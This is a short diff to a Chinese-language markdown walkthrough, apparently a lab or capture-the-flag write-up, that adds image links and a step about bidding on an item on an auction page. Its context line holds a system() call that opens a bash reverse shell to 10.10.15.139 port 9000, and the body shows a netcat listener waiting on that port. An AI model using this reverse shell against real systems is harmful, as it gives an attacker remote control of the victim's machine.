@@ -220,7 +220,9 @@ system("bash -c 'bash -i >& /dev/tcp/10.10.15.139/9000 0>&1'"); return true;
 [★]$ nc -lvnp 9000
 listening on [any] 9000 ...
 ```
+![图片](images/2026040403.png)
 #### 最后，我们需要进入“竞拍”页面，并为该特定物品进行出价。
+![图片](images/2026040404.png)
 ```
 [★]$ nc -lvnp 9000
 listening on [any] 9000 ...
